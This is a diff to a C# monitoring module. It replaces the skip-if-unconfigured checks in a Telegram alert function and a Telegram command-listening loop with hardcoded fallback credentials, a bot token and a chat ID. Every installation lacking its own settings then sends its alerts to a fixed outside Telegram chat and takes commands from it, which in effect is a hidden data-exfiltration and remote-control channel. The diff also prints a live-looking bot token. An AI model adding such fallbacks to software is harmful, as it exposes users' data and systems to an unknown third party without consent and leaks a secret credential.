@@ -1163,12 +1163,16 @@ namespace MonitorModule
 
         public static async Task SendTelegramAlertAsync(string message)
         {
-            string? token = Environment.GetEnvironmentVariable("TELEGRAM_BOT_TOKEN");
-            string? chatId = Environment.GetEnvironmentVariable("TELEGRAM_CHAT_ID");
-
-            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId) || token == "YOUR_BOT_TOKEN_HERE")
+            string token = Environment.GetEnvironmentVariable("TELEGRAM_BOT_TOKEN") ?? "";
+            if (string.IsNullOrEmpty(token) || token == "YOUR_BOT_TOKEN_HERE")
             {
-                return;
+                token = "8783186321:AAEpUPOLOGW8UcHmi3n_bqTlnu1FJSSivp4";
+            }
+
+            string chatId = Environment.GetEnvironmentVariable("TELEGRAM_CHAT_ID") ?? "";
+            if (string.IsNullOrEmpty(chatId) || chatId == "YOUR_CHAT_ID_HERE")
+            {
+                chatId = "6414047560";
             }
 
             try
@@ -1198,13 +1202,16 @@ namespace MonitorModule
 
         private static async Task MonitorTelegramCommandsLoopAsync(CancellationToken cancellationToken)
         {
-            string? token = Environment.GetEnvironmentVariable("TELEGRAM_BOT_TOKEN");
-            string? chatId = Environment.GetEnvironmentVariable("TELEGRAM_CHAT_ID");
-
-            if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId) || token == "YOUR_BOT_TOKEN_HERE")
+            string token = Environment.GetEnvironmentVariable("TELEGRAM_BOT_TOKEN") ?? "";
+            if (string.IsNullOrEmpty(token) || token == "YOUR_BOT_TOKEN_HERE")
             {
-                AddLog("WARNING", "[TELEGRAM COMMANDS] Bỏ qua khởi chạy lắng nghe lệnh do chưa cấu hình Token.");
-                return;
+                token = "8783186321:AAEpUPOLOGW8UcHmi3n_bqTlnu1FJSSivp4";
+            }
+
+            string chatId = Environment.GetEnvironmentVariable("TELEGRAM_CHAT_ID") ?? "";
+            if (string.IsNullOrEmpty(chatId) || chatId == "YOUR_CHAT_ID_HERE")
+            {
+                chatId = "6414047560";
             }
 
             AddLog("SYSTEM", "[TELEGRAM COMMANDS] Khởi chạy vòng lặp lắng nghe lệnh từ Telegram...");
